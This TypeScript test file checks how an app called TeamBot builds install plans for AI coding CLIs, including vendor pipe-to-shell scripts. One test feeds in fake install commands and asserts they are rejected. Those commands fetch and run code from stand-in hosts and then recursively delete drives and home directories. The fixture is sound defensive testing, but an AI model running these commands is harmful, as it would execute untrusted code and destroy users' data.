import { test } from 'node:test';
import assert from 'node:assert/strict';
import { CLI_DEFS, installPlan } from '../server/modules/cli-agents/catalog.js';
import { isRuntimeId } from '../server/modules/cli-agents/runtimes.js';
import { startTestApp } from './helpers.js';

/**
 * "Installeren" for every AI program TeamBot can install itself, also on a computer without npm or uv (TeamBot then
 * brings its own Node.js or uv, core/runtimes.ts), else with the vendor's own install script. Only a program with no
 * official way TeamBot can run (a note only) keeps just the commands to copy.
 */

const engines = CLI_DEFS.filter((d) => !d.custom && d.engine !== 'unsupported' && !isRuntimeId(d.id));

test('elk AI-programma met een officiële npm-, uv- of scriptinstallatie heeft één Installeren, op Windows en elders', () => {
  for (const platform of ['win32', 'linux', 'darwin'] as const) {
    const none = engines.filter((d) => !installPlan(d, platform)).map((d) => d.id);
    // Antigravity comes with Google's own app; Goose has no command TeamBot can run on Windows (a note only).
    assert.deepEqual(none, platform === 'win32' ? ['antigravity', 'goose'] : ['antigravity'], platform);
  }
  // npm first (also without npm on the computer: TeamBot's own Node.js), with the flags of the official line.
  assert.deepEqual(installPlan(engines.find((d) => d.id === 'gemini-cli')!, 'win32'), { kind: 'npm', args: ['install', '-g', '@google/gemini-cli'] });
  assert.deepEqual(installPlan(CLI_DEFS.find((d) => d.id === 'pi-agent')!, 'win32'), { kind: 'npm', args: ['install', '-g', '--ignore-scripts', '@earendil-works/pi-coding-agent'] });
  assert.deepEqual(installPlan(engines.find((d) => d.label.startsWith('Amp'))!, 'linux'), { kind: 'npm', args: ['install', '-g', '@ampcode/cli', 'amp-acp'] });
  // uv (TeamBot's own uv where the computer has none).
  assert.deepEqual(installPlan(engines.find((d) => d.label === 'Mistral Vibe')!, 'win32'), { kind: 'uv', args: ['tool', 'install', 'mistral-vibe'] });
  // The vendor's own script, exactly as the official line says it.
  const cursor = engines.find((d) => d.label === 'Cursor CLI')!;
  assert.deepEqual(installPlan(cursor, 'win32'), { kind: 'script', shell: 'powershell', command: "irm 'https://cursor.com/install?win32=true' | iex" });
  assert.deepEqual(installPlan(cursor, 'linux'), { kind: 'script', shell: 'sh', command: 'curl https://cursor.com/install -fsS | bash' });
  const junie = engines.find((d) => d.label === 'JetBrains Junie')!;
  assert.equal(installPlan(junie, 'win32')?.kind, 'npm');
  // Nothing that is not an official line of that form ever runs.
  const fake = { ...cursor, npmPackage: undefined, install: { windows: 'irm https://evil.example/x.ps1 | iex; Remove-Item C:\\ -Recurse', unix: 'curl https://x.example/i.sh | bash && rm -rf ~', npm: 'npm install -g ok && rm -rf /' } };
  assert.equal(installPlan(fake as any, 'win32'), null);
  assert.equal(installPlan(fake as any, 'linux'), null);
});

test('de lijst met AI-programma’s biedt Installeren aan waar TeamBot het zelf kan', async () => {
  const t = await startTestApp();
  try {
    const st = await t.api('GET', '/cli-agents/status');
    const byId = new Map(st.items.map((i: any) => [i.id, i]));
    for (const d of engines) {
      const it: any = byId.get(d.id);
      if (!it || it.installed) continue;
      assert.equal(it.canInstall, !!installPlan(d), `${d.label}: ${it.canInstall ? 'Installeren' : 'alleen zelf'}`);
    }
  } finally {
    await t.close();
  }
});
